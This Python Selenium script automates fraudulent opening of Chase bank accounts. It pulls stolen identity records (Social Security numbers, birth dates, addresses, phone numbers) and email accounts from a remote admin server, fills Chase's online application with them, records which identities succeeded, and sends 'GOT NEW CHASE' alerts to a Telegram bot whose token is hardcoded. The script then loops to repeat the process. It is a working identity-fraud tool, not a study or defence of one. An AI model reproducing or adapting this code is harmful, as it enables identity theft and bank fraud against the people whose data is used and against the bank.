from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import ElementNotVisibleException
from selenium.common.exceptions import ElementNotSelectableException
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import TimeoutException
from selenium.webdriver import ActionChains
import time
import sys
import requests
import json
from requests import get




##################################################################################################################################

def reg_chase():
    r = requests.get('http://datacentervn.net/admin/all_ssn')
    request = json.loads(r.text)[0]
    e = requests.get('http://datacentervn.net/admin/all_email_chase')
    account = json.loads(e.text)[0]
        
        ##################################################################################################################################
    options = webdriver.ChromeOptions()
    options.add_argument('--silent')
    options.add_argument('--start-maximized')
    options.add_argument("no-sandbox")
    options.add_argument("disable-dev-shm-usage")
    options.add_argument("disable-gpu")
    driver = webdriver.Chrome(ChromeDriverManager().install(), chrome_options=options)
    wait = WebDriverWait(driver, 20, poll_frequency=1, ignored_exceptions=[ElementNotVisibleException, ElementNotSelectableException])
    a = ActionChains(driver)
         ####################################################################################################################################
    driver.get("https://account.chase.com/consumer/banking/seo")
    wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "div.field--name-field-reusable-paragraphs:nth-child(3) > div:nth-child(1) > div:nth-child(1) > div:nth-child(1) > div:nth-child(1) > div:nth-child(1) > div:nth-child(1) > div:nth-child(1) > a:nth-child(1)"))).click()
    def expand_shadow_element(element):
      shadow_root = driver.execute_script('return arguments[0].shadowRoot', element)
      return shadow_root
    def telegram(Name):
        url = "https://api.telegram.org/bot1337555928:AAGuXjY70Tu3klABXDQKyqveUKwuAEdLK4E/sendMessage?chat_id=853939530&text="+ Name
        payload = "{\n\t\"method\": \"POST\"\n}"
        headers = {
            'Content-Type': 'application/json'
        }
        response = requests.request("POST", url, headers=headers, data = payload)

        print(response.text.encode('utf8'))
    root1 = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#existingChaseCustomerOptionId")))
    shadow_root1 = expand_shadow_element(root1)
    shadow_root1.find_element_by_css_selector("#existingChaseCustomerOptionId-input-1").click()
    wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#NEXT-nav-ctr-btn"))).click()
    wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#blx-nameBlock-firstName-text-validate-input-field"))).send_keys(request['first_name'].replace(' ',''))
    wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#blx-nameBlock-middleName-text-validate-input-field"))).send_keys(request['middle_name'].replace(' ',''))
    wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#blx-nameBlock-lastName-text-validate-input-field"))).send_keys(request['last_name'].replace(' ',''))
    wait.until(EC.visibility_of_element_located((By.XPATH, "//div[text()='Yes']"))).click()
    wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#dateOfBirth-text-validate-input-field"))).send_keys(request['birth_day'].replace(' ',''))
    wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#maskedSocialSecurityNumber-text-validate-input-field"))).send_keys(request['ssn'].replace(' ',''))
    wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#identificationNumber-text-validate-input-field"))).send_keys(request['ssn'].replace(' ',''))
    wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#select-identificationTypeId-select-validate"))).send_keys('s')
    wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#select-stateId-select-validate"))).click()
    wait.until(EC.visibility_of_element_located((By.XPATH, "//option[@value='"+ request['state'] +"']"))).click()
    wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#streetAddress-blx-residentialAddressBlock-text-validate-input-field"))).send_keys(request['address'])
    wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#apartmentNumber-blx-residentialAddressBlock-text-validate-input-field"))).send_keys(request['suite'])
    wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#phoneNumberId-text-validate-input-field"))).send_keys(request['phone'].replace(' ',''))
    wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#emailAddressId-text-validate-input-field"))).send_keys(account['email'])
    wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#zipCode-blx-residentialAddressBlock-text-validate-input-field"))).send_keys(request['zip'],Keys.TAB)
    wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#city-blx-residentialAddressBlock-label")))
    #time.sleep(3)
    wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#label-navigationAdvisory"))).click()
    wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#NEXT-nav-ctr-btn"))).click()
    wait_check = WebDriverWait(driver, 10, poll_frequency=1, ignored_exceptions=[ElementNotVisibleException, ElementNotSelectableException])
    wait_check1 = WebDriverWait(driver, 5, poll_frequency=1, ignored_exceptions=[ElementNotVisibleException, ElementNotSelectableException])
    wait_check2 = WebDriverWait(driver, 8, poll_frequency=1, ignored_exceptions=[ElementNotVisibleException, ElementNotSelectableException])
    try:
        wait_check1.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#blx-undefined-address-verification-overlay-conf-btn")))
    except TimeoutException:
        driver.quit()
        ssn = requests.get('http://datacentervn.net/admin/update_ssn?id='+request['id']+'&param=status&value=2')
        reg_chase()
    else:
        wait_check1.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#blx-undefined-address-verification-overlay-conf-btn"))).click()
    try:
        wait_check2.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#inner-appErrorOverlayHeader")))
    except TimeoutException:
        print('next')
    else:
        driver.quit()
        ssn = requests.get('http://datacentervn.net/admin/update_ssn?id='+request['id']+'&param=status&value=2')
        reg_chase()  
    try:
        wait_check.until(EC.visibility_of_element_located((By.XPATH, "//span[text()='Employed']"))).click()
    except TimeoutException:
        driver.quit()
        ssn = requests.get('http://datacentervn.net/admin/update_ssn?id='+request['id']+'&param=status&value=2')
        reg_chase()
    else:
        telegram("GOT NEW CHASE")
        chase = requests.get('http://datacentervn.net/admin/update_chase?id='+account['id']+'&param=status&value=1')
        ssn = requests.get('http://datacentervn.net/admin/update_ssn?id='+request['id']+'&param=status&value=1')
        wait.until(EC.visibility_of_element_located((By.XPATH, "//*[@id='select-employerDetails-0-employmentCategoryId-select-validate']"))).click()
        time.sleep(2)
        wait.until(EC.visibility_of_element_located((By.XPATH, "//option[@value='TECHNOLOGY']"))).click()
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#NEXT-nav-ctr-btn"))).click()
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#label-agreementsDisclosuresAcceptance-validate"))).click()
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#NEXT-nav-ctr-btn"))).click()
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#userId-text-validate-input-field"))).send_keys(account['username'])
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#password-text-validate-input-field"))).send_keys(account['password'])
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#confirmedPassword-text-validate-input-field"))).send_keys(account['password'])
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#cardId-text-validate-input-field"))).send_keys('1231')
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#confirmedCardId-text-validate-input-field"))).send_keys('1231',Keys.TAB)
        time.sleep(1)
        wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#NEXT-nav-ctr-btn"))).click()
        wait_setup = WebDriverWait(driver, 30, poll_frequency=1, ignored_exceptions=[ElementNotVisibleException, ElementNotSelectableException])
        wait_setup.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "#SETUP-nav-ctr-btn"))).click()
        time.sleep(5)
        driver.quit()
        reg_chase()
reg_chase()
